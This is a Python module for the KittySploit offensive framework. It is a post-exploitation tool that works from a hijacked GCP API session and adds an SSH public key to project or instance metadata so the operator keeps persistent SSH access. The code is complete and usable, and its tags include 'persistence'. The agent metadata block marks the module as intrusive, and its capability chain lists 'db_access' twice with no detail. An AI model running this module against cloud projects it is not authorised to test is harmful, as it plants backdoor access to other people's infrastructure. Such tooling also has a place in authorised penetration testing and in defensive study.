#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Add SSH Key Metadata",
        "description": "Add an SSH public key to project or instance metadata for legacy SSH access",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "compute", "ssh", "persistence"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['configuration_change', 'api_request'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    ssh_public_key = OptString("", "SSH public key to add (single line)", True)
    username = OptString("", "Unix username embedded in metadata; defaults to current client email local-part", False)
    scope = OptString("project", "Metadata scope: project or instance", False)
    instance_name = OptString("", "Instance name when scope=instance", False)
    zone = OptString("", "Instance zone when scope=instance", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            public_key = str(self.ssh_public_key or "").strip()
            if not public_key:
                print_error("ssh_public_key is required")
                return False

            username = self._resolve_username()
            if not username:
                print_error("Could not resolve username for ssh-keys metadata entry")
                return False

            entry = f"{username}:{public_key}"
            scope = str(self.scope or "project").strip().lower()
            if scope == "instance":
                instance_name = str(self.instance_name or "").strip()
                zone = str(self.zone or "").strip()
                if not instance_name or not zone:
                    print_error("instance_name and zone are required when scope=instance")
                    return False
                result = self._gcp_add_ssh_key_instance_metadata(project_id, zone, instance_name, entry)
            elif scope == "project":
                result = self._gcp_add_ssh_key_project_metadata(project_id, entry)
            else:
                print_error("scope must be 'project' or 'instance'")
                return False

            if not result.get("ok"):
                print_error(f"SSH key metadata update failed: {result.get('error', '')}")
                return False

            print_success(f"SSH key added to {scope} metadata for user {username}")
            output = {
                "project_id": project_id,
                "scope": scope,
                "username": username,
                "entry": entry,
                "response": result.get("body"),
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"SSH key metadata update failed: {exc}")
            return False

    def _resolve_username(self):
        configured = str(self.username or "").strip()
        if configured:
            return configured
        email = self._gcp_client_email()
        if email and "@" in email:
            return email.split("@", 1)[0]
        return ""
